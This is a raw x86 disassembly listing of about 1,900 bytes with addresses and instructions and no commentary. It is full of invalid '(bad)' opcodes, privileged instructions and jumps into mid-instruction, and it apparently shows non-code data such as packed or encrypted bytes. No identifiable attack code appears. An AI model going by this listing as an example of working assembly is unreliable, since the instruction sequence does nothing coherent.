  411ab2:	fidiv  DWORD PTR [ebx+0x3777ec62]
  411ab8:	xchg   esi,eax
  411ab9:	mov    bl,BYTE PTR [ebp+0x7f20a692]
  411abf:	mov    ch,0xe1
  411ac1:	cmp    DWORD PTR [eax+0x47],edi
  411ac4:	and    eax,0x4251fc6c
  411ac9:	or     DWORD PTR [ecx],0x807463ba
  411acf:	js     0x411b37
  411ad1:	repz inc esp
  411ad3:	pop    ss
  411ad4:	loopne 0x411a85
  411ad6:	push   es
  411ad7:	test   al,0x68
  411ad9:	sub    eax,0xdeac0be3
  411ade:	xchg   edx,eax
  411adf:	shl    DWORD PTR [edi+0x11af7090],cl
  411ae5:	aad    0x7e
  411ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae8:	xchg   DWORD PTR [edx-0x58],ebx
  411aeb:	cmp    eax,0x92670c1a
  411af0:	jg     0x411aeb
  411af2:	scas   al,BYTE PTR es:[edi]
  411af3:	jns    0x411b18
  411af5:	adc    al,0xd7
  411af7:	mov    esp,0x400b6c0d
  411afc:	sbb    BYTE PTR [ebx-0x49],dh
  411aff:	mov    dh,0x5a
  411b01:	fwait
  411b02:	not    DWORD PTR [eax+0x5a]
  411b05:	adc    eax,0xc125a5ba
  411b0a:	cwde   
  411b0b:	jb     0x411aff
  411b0d:	mov    ecx,0xda78ebc6
  411b12:	dec    ecx
  411b13:	pop    edx
  411b14:	push   cs
  411b15:	xchg   DWORD PTR [ecx-0x6c8f437],esi
  411b1b:	(bad)  
  411b1c:	lds    edx,FWORD PTR [edi-0x4f]
  411b1f:	rcl    bh,1
  411b21:	mov    ecx,0x592b55dd
  411b26:	sub    DWORD PTR [esp+ebp*4-0xe5e23fa],0xfffffffa
  411b2e:	or     bl,BYTE PTR [esi]
  411b30:	pop    eax
  411b31:	dec    edx
  411b32:	dec    edi
  411b33:	icebp  
  411b34:	mov    ebp,0xcbd5406d
  411b39:	cwde   
  411b3a:	sti    
  411b3b:	cmc    
  411b3c:	shl    BYTE PTR [edx],0x10
  411b3f:	or     eax,0xaa713a0f
  411b44:	and    al,0x1e
  411b46:	ja     0x411af7
  411b48:	sbb    ah,BYTE PTR [ecx+0xe]
  411b4b:	ret    0x8b23
  411b4e:	or     eax,0x9a742274
  411b53:	mov    esp,0xba898e53
  411b58:	pop    esp
  411b59:	push   eax
  411b5a:	xchg   BYTE PTR [edi+eax*1+0x49],ah
  411b5e:	out    0x6,eax
  411b60:	adc    dh,BYTE PTR [ebx+0x4b811e02]
  411b66:	add    dl,ah
  411b68:	dec    esi
  411b69:	push   ebx
  411b6a:	pop    ebx
  411b6b:	je     0x411b6f
  411b6d:	sub    bh,BYTE PTR [ebx-0x4e69bd51]
  411b73:	and    DWORD PTR [edi-0xf],esp
  411b76:	mov    DWORD PTR [esi+0x55],0x8d6066f9
  411b7d:	cmc    
  411b7e:	out    dx,al
  411b7f:	push   es
  411b80:	shr    BYTE PTR [ebx-0x57],0x9f
  411b84:	or     ch,BYTE PTR [edx]
  411b86:	fisttp WORD PTR [esi-0x16071985]
  411b8c:	cmp    ebp,esi
  411b8e:	pop    edi
  411b8f:	add    edx,ecx
  411b91:	cmp    eax,0x81b9431b
  411b96:	sbb    al,BYTE PTR [esp+eiz*8]
  411b99:	arpl   WORD PTR [eax],dx
  411b9b:	cli    
  411b9c:	cmc    
  411b9d:	retf   0x278c
  411ba0:	cmp    ecx,DWORD PTR [edx]
  411ba2:	mov    ecx,DWORD PTR [edx-0x3ad8931d]
  411ba8:	jbe    0x411c27
  411baa:	add    al,BYTE PTR [eax-0x41bb44a0]
  411bb0:	sar    DWORD PTR [edx],0x73
  411bb3:	idiv   BYTE PTR ds:0x5b2861f7
  411bb9:	mov    ecx,DWORD PTR ds:0x8b1b6bce
  411bbf:	loop   0x411b45
  411bc1:	sysexit 
  411bc3:	jb     0x411c2d
  411bc5:	ret    0x150a
  411bc8:	ds mov esp,0xf27a9f1b
  411bce:	push   cs
  411bcf:	mov    edx,esi
  411bd1:	cdq    
  411bd2:	mov    eax,0xe7cb1099
  411bd7:	not    DWORD PTR [edx]
  411bd9:	sub    DWORD PTR [ebp+0x74],ebx
  411bdc:	cwde   
  411bdd:	push   0x63
  411bdf:	add    ch,BYTE PTR [edx]
  411be1:	loope  0x411c21
  411be3:	xchg   edx,eax
  411be4:	fsub   DWORD PTR [edx+edx*8+0x37]
  411be8:	mov    al,0x19
  411bea:	es inc edx
  411bec:	mov    BYTE PTR [ebx],bl
  411bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bef:	out    0xf0,al
  411bf1:	mov    ah,0x79
  411bf3:	lods   eax,DWORD PTR ds:[esi]
  411bf4:	les    ecx,FWORD PTR [edi]
  411bf6:	dec    ecx
  411bf7:	mov    WORD PTR [edx-0x73],?
  411bfa:	jnp    0x411b8a
  411bfc:	or     eax,0xcb5ecbf9
  411c01:	repnz (bad) [edx-0xe]
  411c05:	pop    esp
  411c06:	(bad)  
  411c07:	nop
  411c08:	push   0x28fba6e9
  411c0d:	leave  
  411c0e:	ror    ebp,1
  411c10:	mov    ecx,0x6ed3dbcf
  411c15:	cld    
  411c16:	mov    ds:0xb6d2424d,eax
  411c1b:	das    
  411c1c:	xchg   BYTE PTR [ebx+0x59],dl
  411c1f:	sbb    eax,0x8384d31f
  411c24:	jecxz  0x411c5d
  411c26:	dec    ecx
  411c27:	inc    edx
  411c28:	ja     0x411c7d
  411c2a:	in     al,0x7b
  411c2c:	or     al,0x80
  411c2e:	push   ebp
  411c2f:	sub    BYTE PTR [esp+eiz*4+0x142cb21c],cl
  411c36:	inc    ebp
  411c37:	mov    ebx,0x7ec009f3
  411c3c:	fsubr  QWORD PTR [edx-0x1f]
  411c3f:	inc    ecx
  411c40:	rcr    BYTE PTR [eax],1
  411c42:	sbb    DWORD PTR [edi+0x20],eax
  411c45:	mov    bh,0x8a
  411c47:	test   BYTE PTR [esi+0x12],bl
  411c4a:	ss push es
  411c4c:	jp     0x411c60
  411c4e:	xchg   ebx,eax
  411c4f:	pushf  
  411c50:	add    al,0x61
  411c52:	pop    esi
  411c53:	push   edx
  411c54:	xchg   ecx,eax
  411c55:	lds    esi,FWORD PTR [edx-0x726c5cf0]
  411c5b:	jnp    0x411c06
  411c5d:	or     DWORD PTR es:[edx+0x74],ebp
  411c61:	sub    ecx,edi
  411c63:	and    cl,BYTE PTR [eax+0x3a15a3d1]
  411c69:	mov    ch,0x4f
  411c6b:	(bad)  
  411c6c:	jp     0x411c6e
  411c6e:	xchg   edx,eax
  411c6f:	aaa    
  411c70:	aam    0x4d
  411c72:	dec    esp
  411c73:	and    dl,BYTE PTR [eax+0xd]
  411c76:	in     eax,0x4c
  411c78:	xchg   edx,eax
  411c79:	xchg   DWORD PTR [esi],esi
  411c7b:	icebp  
  411c7c:	cs mov esp,0x628a4cbb
  411c82:	cld    
  411c83:	and    eax,0x8b018cc0
  411c88:	push   ds
  411c89:	jno    0x411c83
  411c8b:	cmp    eax,0xb302b5b3
  411c90:	rcl    DWORD PTR [edi+0x16bea67b],0xfd
  411c97:	xchg   edx,eax
  411c98:	cmp    eax,0x2701e4e5
  411c9d:	mov    bl,0x1f
  411c9f:	push   eax
  411ca0:	xchg   edi,eax
  411ca1:	rcr    bh,0x30
  411ca4:	adc    BYTE PTR [edi],cl
  411ca6:	mov    bh,0x33
  411ca8:	mov    ebp,0xf5df508b
  411cad:	mov    esi,0x6e9879f9
  411cb2:	inc    ecx
  411cb3:	pushf  
  411cb4:	pop    ebx
  411cb5:	mov    ah,0xc
  411cb7:	mov    dh,ah
  411cb9:	jl     0x411c8d
  411cbb:	jb     0x411c4c
  411cbd:	cld    
  411cbe:	test   al,0x54
  411cc0:	dec    esp
  411cc1:	std    
  411cc2:	push   ecx
  411cc3:	aaa    
  411cc4:	adc    eax,0x5f6c8a07
  411cc9:	xchg   edi,eax
  411cca:	ins    BYTE PTR es:[edi],dx
  411ccb:	jo     0x411cb5
  411ccd:	pop    ds
  411cce:	jp     0x411d2b
  411cd0:	in     al,0x53
  411cd2:	mov    ch,0xf1
  411cd4:	(bad)  
  411cd5:	fist   DWORD PTR [esi+0x736b7910]
  411cdb:	mov    BYTE PTR [ebp-0x4f7ae127],cl
  411ce1:	jae    0x411c9c
  411ce3:	pop    ebx
  411ce4:	lods   eax,DWORD PTR ds:[esi]
  411ce5:	dec    eax
  411ce6:	lds    ebx,FWORD PTR [ebx]
  411ce8:	lea    esp,[eax+0x35]
  411ceb:	mov    cl,0x4a
  411ced:	mov    dl,0x9a
  411cef:	xchg   edx,eax
  411cf0:	fld    DWORD PTR [edx-0x1f]
  411cf3:	das    
  411cf4:	jmp    0x411c8c
  411cf6:	mov    bh,0x3b
  411cf8:	mov    eax,ds:0xd34a2976
  411cfd:	in     al,0x51
  411cff:	pop    ss
  411d00:	sbb    DWORD PTR [ebx*4+0x220ea228],edi
  411d07:	xlat   BYTE PTR ds:[ebx]
  411d08:	pop    edi
  411d09:	add    al,0xfc
  411d0b:	cs jno 0x411d6c
  411d0e:	mov    edi,ecx
  411d10:	cmp    edi,DWORD PTR [ebx-0x409b544a]
  411d16:	jbe    0x411d69
  411d18:	mov    dl,0xb6
  411d1a:	inc    ebx
  411d1b:	add    edi,DWORD PTR [edi]
  411d1d:	pop    ds
  411d1e:	fld    DWORD PTR [eax-0x80]
  411d21:	xchg   edi,eax
  411d22:	mov    bl,0x84
  411d24:	ins    DWORD PTR es:[edi],dx
  411d25:	rol    edx,0x80
  411d28:	(bad)  
  411d29:	fdiv   DWORD PTR [eax-0x142a0ab9]
  411d2f:	data16 stc 
  411d31:	sbb    eax,0x11aa3382
  411d36:	pop    eax
  411d37:	and    edx,ebx
  411d39:	out    0xa7,al
  411d3b:	sub    BYTE PTR [esi-0x68],ch
  411d3e:	loopne 0x411d36
  411d40:	in     al,0x21
  411d42:	fwait
  411d43:	les    edx,FWORD PTR [eax]
  411d45:	pop    esp
  411d46:	cmc    
  411d47:	mov    ah,0xcc
  411d49:	xor    ah,BYTE PTR [eax+eiz*2-0x18]
  411d4d:	add    al,0xdc
  411d4f:	mov    ecx,0x7c83a04a
  411d54:	hlt    
  411d55:	sar    DWORD PTR [esi],1
  411d57:	push   ebx
  411d58:	icebp  
  411d59:	pop    edx
  411d5a:	loop   0x411cea
  411d5c:	shr    BYTE PTR [ecx],1
  411d5e:	(bad)
  411d62:	jmp    0x411d44
  411d64:	cmp    eax,DWORD PTR [edi+0x53]
  411d67:	ret    0x17d2
  411d6a:	mov    ebx,0xc3422aec
  411d6f:	jge    0x411dc9
  411d71:	jecxz  0x411d95
  411d73:	bound  edi,QWORD PTR [edx-0x74]
  411d76:	ror    BYTE PTR [edi-0x6d],cl
  411d79:	fimul  DWORD PTR [ebx-0x1b]
  411d7c:	dec    eax
  411d7d:	cmc    
  411d7e:	mov    al,0xd2
  411d80:	xchg   esi,eax
  411d81:	je     0x411df6
  411d83:	(bad)
  411d86:	and    ch,BYTE PTR [ecx-0x42]
  411d89:	mov    ah,0xc6
  411d8b:	out    0x53,eax
  411d8d:	dec    eax
  411d8e:	das    
  411d8f:	in     eax,0xa5
  411d91:	mov    DWORD PTR [esi-0x50],0x59aac695
  411d98:	std    
  411d99:	and    BYTE PTR [ebx+0x5],ah
  411d9c:	pop    eax
  411d9d:	shl    ah,0xa6
  411da0:	imul   esi,DWORD PTR [ebx-0x53b0d56d],0x1c
  411da7:	mov    dl,0xa6
  411da9:	cmp    ebx,DWORD PTR [edx-0x6d157a03]
  411daf:	jbe    0x411d90
  411db1:	xor    bh,BYTE PTR [esi+eax*1]
  411db4:	and    esp,DWORD PTR [eax-0x11]
  411db7:	xchg   ebp,eax
  411db8:	enter  0xb078,0x33
  411dbc:	mov    ch,0x9e
  411dbe:	(bad)  
  411dbf:	ins    DWORD PTR es:[edi],dx
  411dc0:	mov    eax,ds:0x203c1ead
  411dc5:	xchg   edx,eax
  411dc6:	dec    edi
  411dc7:	pop    esi
  411dc8:	ja     0x411ded
  411dca:	hlt    
  411dcb:	int    0x24
  411dcd:	or     eax,0x6d8958bf
  411dd2:	cmp    eax,0xf45d0d59
  411dd7:	loop   0x411d5e
  411dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dda:	push   ss
  411ddb:	xchg   DWORD PTR ds:[ebx],ecx
  411dde:	stc    
  411ddf:	pop    ebx
  411de0:	int    0xa
  411de2:	xchg   DWORD PTR [esi+0x2],edi
  411de5:	out    dx,eax
  411de6:	cwde   
  411de7:	cmp    DWORD PTR [edi+edi*2+0x353d09e2],0xffffffbb
  411def:	jle    0x411e41
  411df1:	and    eax,0xfd29a861
  411df6:	imul   edx,DWORD PTR [esi-0x16],0xffffffd6
  411dfa:	mov    fs,esp
  411dfc:	pop    ss
  411dfd:	sub    BYTE PTR [eax+ebx*1+0x6a3f3891],bl
  411e04:	loope  0x411ddc
  411e06:	mov    al,ds:0x6ac4981a
  411e0b:	inc    ebx
  411e0c:	pop    esp
  411e0d:	add    bh,BYTE PTR [edi]
  411e0f:	pop    ss
  411e10:	inc    edx
  411e11:	push   ebx
  411e12:	bound  esi,QWORD PTR [edx-0x3643a638]
  411e18:	fsubr  DWORD PTR [ecx]
  411e1a:	sbb    BYTE PTR [edi-0x769feaf0],dh
  411e20:	aam    0x7b
  411e22:	(bad)  
  411e23:	fnstenv [esi+0x635ac263]
  411e29:	jae    0x411db9
  411e2b:	pop    ebp
  411e2c:	inc    ebp
  411e2d:	jg     0x411e5e
  411e2f:	in     al,dx
  411e30:	push   0xcc329702
  411e35:	(bad)  
  411e36:	dec    edi
  411e37:	cmp    esp,esp
  411e39:	inc    edx
  411e3a:	and    DWORD PTR [edi],0x4154189a
  411e40:	cs int 0xd9
  411e43:	stc    
  411e44:	cmp    BYTE PTR [esi],al
  411e46:	popa   
  411e47:	mov    ss,WORD PTR [esi+eax*8]
  411e4a:	dec    ebx
  411e4b:	mov    bh,0x81
  411e4d:	pop    ebp
  411e4e:	and    BYTE PTR [edi-0x2d68426e],bl
  411e54:	enter  0xd4cd,0x59
  411e58:	push   0x5387be1d
  411e5d:	add    bh,BYTE PTR [ecx+0x7ba12a99]
  411e63:	out    dx,al
  411e64:	les    ebx,FWORD PTR [eax-0x76]
  411e67:	adc    eax,0x25a625da
  411e6c:	cmpps  xmm3,XMMWORD PTR [edx-0x78],0x82
  411e71:	add    al,0xdf
  411e73:	pop    eax
  411e74:	mov    es,WORD PTR [eax]
  411e76:	cmp    al,0x88
  411e78:	hlt    
  411e79:	jge    0x411ec7
  411e7b:	push   ecx
  411e7c:	mov    edi,cs
  411e7e:	mov    bh,0xda
  411e80:	in     al,dx
  411e81:	lods   eax,DWORD PTR ds:[esi]
  411e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e83:	cmp    BYTE PTR [esi-0x4d68d7a5],0x89
  411e8a:	cmc    
  411e8b:	in     eax,dx
  411e8c:	sub    al,0x3d
  411e8e:	sub    eax,ebx
  411e90:	fstp   QWORD PTR [ebp-0x42931803]
  411e96:	push   ecx
  411e97:	mov    cl,0x43
  411e99:	cs xchg ecx,eax
  411e9c:	jmp    0x411ea1
  411e9e:	div    eax
  411ea0:	sub    DWORD PTR ds:0xfa35e6a7,0xffffffa0
  411ea7:	add    eax,0xb35d2de4
  411eac:	fisttp QWORD PTR [ebx+0x166849ed]
  411eb2:	ins    DWORD PTR es:[edi],dx
  411eb3:	je     0x411e94
  411eb5:	or     bh,0x92
  411eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb9:	imul   edi,edx,0x42
  411ebc:	leave  
  411ebd:	mul    DWORD PTR ds:0x90e9299a
  411ec3:	pop    esp
  411ec4:	adc    al,0xe4
  411ec6:	add    BYTE PTR [esi+0x6c],dh
  411ec9:	ja     0x411ee0
  411ecb:	mov    edi,0xdf7f05cc
  411ed0:	dec    eax
  411ed1:	mov    ?,WORD PTR [ebx+0x7376daf]
  411ed7:	repnz inc eax
  411ed9:	jg     0x411e62
  411edb:	and    DWORD PTR [edi+eiz*2-0x6c],0x52
  411ee0:	push   edi
  411ee1:	push   cs
  411ee2:	adc    bh,BYTE PTR [eax-0x720a866b]
  411ee8:	mov    ch,0x4b
  411eea:	cli    
  411eeb:	xchg   edx,eax
  411eec:	cwde   
  411eed:	dec    esp
  411eee:	pop    ebp
  411eef:	mov    dl,0xa3
  411ef1:	es jno 0x411f62
  411ef4:	loope  0x411f70
  411ef6:	jmp    0x411f40
  411ef8:	cld    
  411ef9:	(bad)  
  411efa:	js     0x411f1e
  411efc:	mov    esi,0xbb656989
  411f01:	mov    ebx,0xb5dd4412
  411f06:	inc    esp
  411f07:	ror    DWORD PTR [eax+ecx*4-0x77],cl
  411f0b:	cdq    
  411f0c:	lods   al,BYTE PTR gs:[esi]
  411f0e:	inc    ebp
  411f0f:	jnp    0x411f79
  411f11:	(bad)  
  411f13:	cwde   
  411f14:	inc    ecx
  411f15:	rcr    DWORD PTR [ebx],1
  411f17:	xor    eax,DWORD PTR [eax+0x47]
  411f1a:	jns    0x411eff
  411f1c:	pop    es
  411f1d:	ret    
  411f1e:	xor    ecx,DWORD PTR ds:0x65ba93d6
  411f24:	jne    0x411f52
  411f26:	ret    0x2abb
  411f29:	cmp    DWORD PTR [edx-0x14e4db66],esp
  411f2f:	fdivr  QWORD PTR [esi+0x6a]
  411f32:	xchg   ecx,eax
  411f33:	or     DWORD PTR [ecx+ebx*2-0x2501ee93],esp
  411f3a:	scas   al,BYTE PTR es:[edi]
  411f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f3c:	mov    esi,0xb22e2282
  411f41:	test   al,0xb3
  411f43:	mov    cl,0xe4
  411f45:	fild   WORD PTR [edx-0x59]
  411f48:	mov    eax,0x220e521d
  411f4d:	fdiv   DWORD PTR [ecx+0x44206617]
  411f53:	mov    ch,0x58
  411f55:	push   ecx
  411f56:	mov    eax,0x1feb235d
  411f5b:	cwde   
  411f5c:	jge    0x411f53
  411f5e:	cwde   
  411f5f:	inc    ebp
  411f60:	ss jmp 0xaeebff9e
  411f66:	(bad)  
  411f67:	xchg   ebx,eax
  411f68:	xchg   BYTE PTR [edx-0x6bd0b4e4],cl
  411f6e:	jp     0x411f4e
  411f70:	jmp    0x411fcf
  411f72:	push   ss
  411f73:	push   esp
  411f74:	sub    al,BYTE PTR [eax-0x2e8a577d]
  411f7a:	ds xchg edx,eax
  411f7c:	jle    0x411f80
  411f7e:	xor    DWORD PTR [ebx-0x7df1a874],ebp
  411f84:	xchg   BYTE PTR ds:0x3ec4961f,bh
  411f8a:	fs popf 
  411f8c:	pop    es
  411f8d:	sub    al,0x50
  411f8f:	mov    edx,0x3842d192
  411f94:	cwde   
  411f95:	gs jmp 0xa258:0x4099e38a
  411f9d:	or     eax,0x75d49006
  411fa2:	imul   edi,DWORD PTR [edx-0x713367e0],0xffffffc0
  411fa9:	imul   esp,DWORD PTR [eax+ecx*1-0x74],0x8ef8699d
  411fb1:	das    
  411fb2:	mov    BYTE PTR [edi-0x58e2e591],ah
  411fb8:	xor    DWORD PTR [esi+edi*2-0x4],0xc44f1e3c
  411fc0:	adc    BYTE PTR [ebp+0x66ea6f98],0x88
  411fc7:	imul   esp,edx,0xa271ded9
  411fcd:	cmp    al,BYTE PTR [edi+eiz*4]
  411fd0:	and    ch,cl
  411fd2:	test   al,0x9c
  411fd4:	in     eax,dx
  411fd5:	test   DWORD PTR [eax+0x44],esp
  411fd8:	or     eax,0x66afcb15
  411fdd:	sahf   
  411fde:	sub    al,al
  411fe0:	adc    al,0x8b
  411fe2:	mov    dh,BYTE PTR [edi-0x24]
  411fe5:	inc    esi
  411fe6:	ror    dl,1
  411fe8:	mov    al,0x69
  411fea:	sbb    ah,BYTE PTR [ebx-0x6aeb6ed3]
  411ff0:	scas   al,BYTE PTR es:[edi]
  411ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff2:	push   ecx
  411ff3:	jno    0x411fa9
  411ff5:	mov    eax,ds:0xdff99b07
  411ffa:	ror    BYTE PTR [edx+0x30],cl
  411ffd:	lahf   
  411ffe:	call   0xeead3981
  412003:	jae    0x412058
  412005:	xchg   bl,al
  412007:	push   eax
  412008:	sub    DWORD PTR [ecx-0x120a2a6e],ecx
  41200e:	dec    edi
  41200f:	push   esi
  412010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412011:	jnp    0x412019
  412013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412014:	add    eax,0x9df4afc7
  412019:	gs or  ecx,edi
  41201c:	pop    ebx
  41201d:	dec    edx
  41201e:	ins    BYTE PTR es:[edi],dx
  41201f:	xchg   edx,eax
  412020:	in     al,0xf2
  412022:	push   0xb24f11e9
  412027:	enter  0x8074,0xc9
  41202b:	(bad)  
  41202d:	sbb    BYTE PTR [ebx+0x62],0xeb
  412031:	sub    ecx,DWORD PTR [edi+0x5f]
  412034:	out    dx,al
  412035:	and    eax,ebx
  412037:	lods   al,BYTE PTR ds:[esi]
  412038:	and    eax,0xb57fd53b
  41203d:	ins    BYTE PTR es:[edi],dx
  41203e:	or     BYTE PTR [ebx-0x50],ch
  412041:	jl     0x41207a
  412043:	gs mov dl,0x5c
  412046:	int    0x4c
  412048:	imul   ebp,esp,0xffffffcb
  41204b:	leave  
  41204c:	cmp    BYTE PTR gs:[esi+0x7e65e944],0x8e
  412054:	adc    eax,0x31021a35
  412059:	adc    ebp,eax
  41205b:	mov    ecx,0x68730b48
  412060:	sub    eax,0x9673eec
  412065:	popf   
  412066:	ss in  eax,dx
  412068:	xor    eax,0xa849c7ba
  41206d:	add    al,0x55
  41206f:	inc    edx
  412070:	dec    eax
  412071:	cmp    BYTE PTR [ebp+0x572ebf9c],ch
  412077:	mov    edx,DWORD PTR [edx-0x1e]
  41207a:	mov    edx,0x73567978
  41207f:	pop    edx
  412080:	adc    edi,eax
  412082:	addr16 aad 0xf1
  412085:	pushf  
  412086:	test   eax,0x6e95e94c
  41208b:	test   BYTE PTR [edi+0x4ec4ae92],ah
  412091:	xor    al,0x76
  412093:	(bad)  
  412094:	adc    DWORD PTR [esi+ebx*2+0x58b305e8],ebp
  41209b:	(bad)  
  41209c:	sub    edi,DWORD PTR [edi-0x1b]
  41209f:	xchg   esi,eax
  4120a0:	cld    
  4120a1:	hlt    
  4120a2:	cmp    BYTE PTR [edx-0x199b1850],bl
  4120a8:	int3   
  4120a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120aa:	inc    esi
  4120ab:	in     al,0x50
  4120ad:	rol    ebx,1
  4120af:	outs   dx,BYTE PTR ds:[esi]
  4120b0:	jno    0x4120f5
  4120b2:	mov    WORD PTR [eax-0x11783dd3],?
  4120b8:	rcl    BYTE PTR [esi+0x3d],cl
  4120bb:	xchg   ecx,eax
  4120bc:	fdiv   QWORD PTR [ebp+0x169f7218]
  4120c2:	lods   al,BYTE PTR ds:[esi]
  4120c3:	fprem  
  4120c5:	sub    ecx,eax
  4120c7:	div    DWORD PTR [eax-0xf821f01]
  4120cd:	(bad)  
  4120ce:	jae    0x41206c
  4120d0:	icebp  
  4120d1:	fcomp  DWORD PTR [ecx]
  4120d3:	and    esi,DWORD PTR [edi]
  4120d5:	mov    edi,0x3def68ba
  4120da:	(bad)  
  4120db:	and    ah,al
  4120dd:	adc    eax,0xd9bccf91
  4120e2:	popa   
  4120e3:	push   ss
  4120e4:	mov    eax,0x111aaed9
  4120e9:	sbb    DWORD PTR [esi+ecx*4],0xe36d5dc1
  4120f0:	ret    0x430f
  4120f3:	xchg   DWORD PTR [edi-0x4c],esi
  4120f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120f7:	mov    esp,0xbf446ec2
  4120fc:	bound  edi,QWORD PTR ds:0x6c4cd3e2
  412102:	jns    0x4120bd
  412104:	das    
  412105:	inc    eax
  412106:	pushf  
  412107:	add    esp,DWORD PTR [eax+0x2e]
  41210a:	mov    eax,ds:0xe45bbfed
  41210f:	adc    eax,0x35adeb07
  412114:	xchg   edi,eax
  412115:	lea    ebx,[eax-0x20]
  412118:	push   ebp
  412119:	push   0x8e6167fb
  41211e:	pop    esi
  41211f:	gs sub esp,esi
  412122:	das    
  412123:	sub    al,0xc5
  412125:	loopne 0x412116
  412127:	hlt    
  412128:	fdivp  st(7),st
  41212a:	inc    edi
  41212b:	pop    edx
  41212c:	cmp    cl,bl
  41212e:	mov    ah,0xbb
  412130:	mov    ecx,0x91dad19
  412135:	add    edi,ecx
  412137:	push   0xffffffde
  412139:	mov    esi,0x4b5a4057
  41213e:	hlt    
  41213f:	retf   0xd494
  412142:	mov    esp,0x45221447
  412147:	ins    BYTE PTR es:[edi],dx
  412148:	cmp    BYTE PTR [ebx],dh
  41214a:	mov    esi,0xeba6ce85
  41214f:	js     0x4121aa
  412151:	leave  
  412152:	ja     0x41218f
  412154:	lds    eax,FWORD PTR [edi]
  412156:	mov    al,bl
  412158:	ret    
  412159:	mov    cl,0x9c
  41215b:	xchg   esi,eax
  41215c:	inc    edi
  41215d:	retf   0xbb00
  412160:	pop    edx
  412161:	xor    bl,dl
  412163:	sub    ebp,ebx
  412165:	add    DWORD PTR [edi+0x4],eax
  412168:	clc    
  412169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41216a:	mov    al,BYTE PTR [ecx+0x4f3fd6ef]
  412170:	in     eax,dx
  412171:	and    edi,DWORD PTR [edi+esi*4+0x61]
  412175:	test   DWORD PTR [esi],edi
  412177:	fwait
  412178:	jg     0x412155
  41217a:	stos   BYTE PTR es:[edi],al
  41217b:	bnd jge 0x4121b5
  41217e:	push   ss
  41217f:	jbe    0x4121e6
  412181:	dec    ebx
  412182:	test   cl,ah
  412184:	stos   DWORD PTR es:[edi],eax
  412185:	and    eax,edx
  412187:	and    eax,eax
  412189:	mov    eax,ds:0xfb1eeb14
  41218e:	aaa    
  41218f:	fdiv   DWORD PTR [edi-0xabc3e57]
  412195:	sahf   
  412196:	cmp    eax,0x28fe9fe1
  41219b:	and    eax,0xae33e907
  4121a0:	in     eax,dx
  4121a1:	shl    DWORD PTR [esi+0x6b8f9b6e],0x49
  4121a8:	sbb    eax,DWORD PTR [eax-0x4352a723]
  4121ae:	xor    al,0xd6
  4121b0:	scas   al,BYTE PTR es:[edi]
  4121b1:	jns    0x41222d
  4121b3:	xchg   edx,eax
  4121b4:	cmp    al,0x20
  4121b6:	inc    ecx
  4121b7:	jp     0x412221
  4121b9:	loopne 0x41222d
  4121bb:	or     BYTE PTR [eax+0x200a8de0],bh
  4121c1:	scas   al,BYTE PTR es:[edi]
  4121c2:	and    eax,0x5c45e4c2
  4121c7:	fsubp  st(2),st
  4121c9:	lock mov ecx,0x8a1b6d26
  4121cf:	mov    bp,0xc59
  4121d3:	xor    eax,DWORD PTR [eax-0x63]
  4121d6:	ins    DWORD PTR es:[edi],dx
  4121d7:	mov    eax,ds:0x2dcd5b7f
  4121dc:	fnstsw ax
  4121de:	mov    esp,0x1c8f14f4
  4121e3:	fwait
  4121e4:	cmp    BYTE PTR [edx+ebx*2+0x2b],dh
  4121e8:	dec    esp
  4121e9:	push   ss
  4121ea:	mov    edx,0x5a3686ad
  4121ef:	call   0x3fde:0x18f7fc1d
  4121f6:	das    
  4121f7:	mov    eax,ds:0x39ecc362
  4121fc:	stos   DWORD PTR es:[edi],eax
  4121fd:	test   al,0x24
  4121ff:	sahf   
  412200:	sbb    al,0xe1
  412202:	and    al,0x80
  412204:	imul   ebp,DWORD PTR [ecx+0x27521a70],0xffffffe6
  41220b:	addr16 icebp 
  41220d:	sbb    bh,BYTE PTR [ebx]
  41220f:	test   al,0xdf
  412211:	retf   0xbdd4
  412214:	loope  0x41223b
  412216:	xlat   BYTE PTR ds:[ebx]
  412217:	pop    edi
  412218:	mov    ch,0x4b
  41221a:	ins    DWORD PTR es:[edi],dx
  41221b:	enter  0xfe56,0x69
  41221f:	sbb    DWORD PTR [edx+0x7401a08],ecx
  412225:	pop    ebp
  412226:	cli    
  412227:	js     0x41225d
  412229:	fidivr WORD PTR [ecx+0xc]
  41222c:	jl     0x412267
  41222e:	mov    ebp,0x757fb197
  412233:	push   ds
  412234:	add    BYTE PTR [ecx+0x1fa40196],bl
  41223a:	add    al,0xd9
  41223c:	imul   dh
  41223e:	mov    al,0x9e
  412240:	adc    al,0xf3
  412242:	bound  esi,QWORD PTR [ecx]
  412244:	push   0x1c
  412246:	clc    
  412247:	xchg   BYTE PTR [ebp+0x142096b0],dh
  41224d:	loope  0x412210
  41224f:	add    BYTE PTR [eax+ebp*1],al
  412252:	rol    BYTE PTR [edi+0x30dcfc6a],cl
  412258:	mov    ah,ch
  41225a:	inc    edi
  41225b:	fcomp  st(5)
  41225d:	mov    ds,WORD PTR [ebp+eax*2-0x4fad6689]
  412264:	xchg   ebx,eax
  412265:	add    BYTE PTR [ebp+ebp*8-0x4b2629a7],bh
  41226c:	and    ecx,esp
  41226e:	addr16 jae 0x41226b
  412271:	stos   BYTE PTR es:[edi],al
  412272:	pop    ecx
  412273:	(bad)  
  412274:	retf   0x48d1
  412277:	dec    ecx
  412278:	add    BYTE PTR [edx-0x70],ch
  41227b:	pop    edx
  41227c:	dec    eax
  41227d:	push   eax
  41227e:	fldenv [ecx+0x6763300a]
  412284:	aas    
  412285:	mov    ds:0xbaad7ccf,al
  41228a:	test   eax,0xf39d787d
  41228f:	cli    
  412290:	jmp    0xc9ec:0x532c5c70
  412297:	loope  0x4122a8
  412299:	lods   eax,DWORD PTR ds:[esi]
  41229a:	outs   dx,BYTE PTR ds:[esi]
  41229b:	bound  ebp,QWORD PTR [edi+0x7a]
